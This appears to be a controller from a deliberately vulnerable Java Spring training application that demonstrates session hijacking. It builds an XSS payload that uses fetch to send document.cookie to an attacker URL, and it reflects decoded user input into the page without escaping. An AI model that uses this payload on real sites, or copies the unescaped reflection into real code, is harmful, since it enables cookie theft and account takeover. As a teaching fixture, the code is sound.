package org.t246osslab.easybuggy4sb.vulnerabilities;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;
import org.t246osslab.easybuggy4sb.controller.AbstractController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.Base64;
import java.util.Locale;

@Controller
public class SessionHijackingController extends AbstractController {

    @Value("${attacker.app.url}")
    protected String attackerAppUrl;

    @RequestMapping(value = "/admins/seshj")
    protected ModelAndView process(@RequestParam(value = "string", required = false) String string, ModelAndView mav,
                                   HttpSession session, HttpServletRequest req, HttpServletResponse res, Locale locale) throws IOException {
        if (session == null) {
            res.sendRedirect("/");
            return null;
        }
        setViewAndCommonObjects(mav, locale, "seshj");
        if (!"http://attacker.site".equals(attackerAppUrl)) {
            String queryString = new String(Base64.getUrlEncoder().encode(("</p><script>fetch('" + attackerAppUrl + "?' + document.cookie)</script><p>").getBytes()));
            String hijackingURL = req.getRequestURL().toString() + "?string=" + queryString;
            String[] placeholders = new String[]{ hijackingURL, req.getRequestURL().toString() };
            mav.addObject("note", msg.getMessage("msg.note.seshj", placeholders, locale));
        } else {
            mav.addObject("note", msg.getMessage("msg.note.seshj2", null, locale));
        }
        if (!org.apache.commons.lang3.StringUtils.isBlank(string)) {
            try {
                byte[] decodedBytes = Base64.getUrlDecoder().decode(string);
                String decodedString = new String(decodedBytes);
                mav.addObject("msg", msg.getMessage("label.decoded.string", null, locale) + " :<br />" + decodedString);
            } catch (IllegalArgumentException e){
                mav.addObject("errmsg", msg.getMessage("msg.decode.error.occur", null, locale));
                mav.addObject("detailmsg", e.getMessage());
            }
        }
        return mav;
    }
}
